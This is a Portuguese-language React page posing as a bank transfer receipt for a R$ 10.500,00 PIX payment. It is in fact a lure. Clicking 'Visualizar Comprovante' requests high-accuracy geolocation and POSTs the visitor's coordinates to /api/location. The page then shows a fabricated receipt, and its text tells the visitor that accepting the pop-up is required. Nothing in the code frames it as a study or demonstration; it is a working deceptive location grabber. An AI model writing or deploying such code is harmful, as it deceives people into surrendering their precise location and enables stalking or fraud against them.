'use client';

import { useState, useEffect } from 'react';

function FormattedDate() {
  const [mounted, setMounted] = useState(false);
  const [date, setDate] = useState<Date | null>(null);

  useEffect(() => {
    setMounted(true);
    setDate(new Date());
  }, []);

  if (!mounted || !date) return <p className="text-green-100 text-sm mt-1">&nbsp;</p>;

  return (
    <p className="text-green-100 text-sm mt-1">
      {date.toLocaleDateString('pt-BR')} às {date.toLocaleTimeString('pt-BR')}
    </p>
  );
}

export default function Home() {
  const [showReceipt, setShowReceipt] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleShowReceipt = () => {
    setLoading(true);
    setError('');

    if (!('geolocation' in navigator)) {
      setError('Geolocalização não é suportada pelo seu navegador.');
      setLoading(false);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        try {
          const { latitude, longitude } = position.coords;

          await fetch('/api/location', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              latitude,
              longitude,
            }),
          });

          setShowReceipt(true);
        } catch (err) {
          console.error(err);
          setShowReceipt(true);
        } finally {
          setLoading(false);
        }
      },
      (geoError) => {
        console.error(geoError);
        setError('É necessário aceitar o pop-up para visualizar o comprovante.');
        setLoading(false);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  };

  if (showReceipt) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4 font-sans">
        <div className="bg-white shadow-lg rounded-lg max-w-md w-full overflow-hidden">
          <div className="bg-green-600 p-6 text-center">
            <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center mx-auto mb-4">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h2 className="text-white text-xl font-bold">Transferência Realizada!</h2>
            <FormattedDate />
          </div>
          
          <div className="p-6 space-y-4">
            <div className="border-b pb-4">
              <p className="text-gray-500 text-sm">Valor da transferência</p>
              <h1 className="text-3xl font-bold text-gray-800">R$ 10.500,00</h1>
            </div>

            <div className="grid grid-cols-2 gap-4 text-sm">
              <div>
                <p className="text-gray-500">Destinatário</p>
                <p className="font-semibold text-gray-800">João da Silva</p>
              </div>
              <div>
                <p className="text-gray-500">Instituição</p>
                <p className="font-semibold text-gray-800">Nubank</p>
              </div>
              <div>
                <p className="text-gray-500">Tipo de transferência</p>
                <p className="font-semibold text-gray-800">PIX</p>
              </div>
              <div>
                <p className="text-gray-500">Autenticação</p>
                <p className="font-semibold text-gray-800 truncate">7d8f92j3k4...</p>
              </div>
            </div>

            <div className="pt-6 mt-4 border-t flex flex-col gap-3">
              <button 
                onClick={() => window.location.reload()}
                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-800 font-medium py-3 px-4 rounded transition"
              >
                Nova Transferência
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
      <div className="bg-white shadow-xl rounded-xl p-8 max-w-sm w-full text-center">
        <div className="mb-6 bg-blue-50 w-20 h-20 rounded-full flex items-center justify-center mx-auto">
          <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
          </svg>
        </div>
        
        <h1 className="text-2xl font-bold text-gray-800 mb-2">Comprovante Disponível</h1>
        <p className="text-gray-500 mb-8">
          O comprovante da sua transferência de <span className="font-bold text-gray-800">R$ 10.500,00</span> está pronto para visualização.
        </p>

        {error && (
          <div className="mb-4 p-3 bg-red-50 text-red-600 text-sm rounded-lg border border-red-100">
            {error}
          </div>
        )}

        <button
          onClick={handleShowReceipt}
          disabled={loading}
          className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-6 rounded-lg transition transform active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed shadow-md hover:shadow-lg flex items-center justify-center gap-2"
        >
          {loading ? (
            <>
              <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
              Verificando...
            </>
          ) : (
            'Visualizar Comprovante'
          )}
        </button>
        
        <p className="mt-4 text-xs text-gray-400">
          * Clique em aceitar no pop-up para exibir as informações de pagamento.
        </p>
      </div>
    </div>
  );
}
